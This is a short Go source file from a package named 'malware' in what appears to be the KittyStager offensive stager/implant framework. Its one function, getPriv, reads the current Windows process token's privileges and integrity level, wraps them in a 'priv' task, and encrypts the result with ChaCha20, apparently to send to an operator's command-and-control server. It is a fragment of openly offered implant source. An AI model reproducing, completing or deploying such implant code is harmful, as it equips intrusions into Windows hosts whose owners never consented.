package malware

import (
	"KittyStager/internal/crypto"
	"KittyStager/internal/task"
	"KittyStager/internal/task/priv"
	"github.com/fourcorelabs/wintoken"
)

func getPriv(key string) ([]byte, error) {
	token, err := wintoken.OpenProcessToken(0, wintoken.TokenPrimary)
	if err != nil {
		return nil, err
	}
	defer token.Close()
	p, err := token.GetPrivileges()
	if err != nil {
		return nil, err
	}
	i, err := token.GetIntegrityLevel()
	if err != nil {
		return nil, err
	}
	pr := priv.NewPrivileges(p, i)
	b, err := pr.MarshallPrivileges()
	if err != nil {
		return nil, err
	}
	t := task.NewTask("priv", b)
	tm, err := t.MarshallTask()
	if err != nil {
		return nil, err
	}
	c := crypto.NewChaCha20()
	e, err := c.Encrypt(tm, []byte(key))
	if err != nil {
		return nil, err
	}
	return e, nil
}
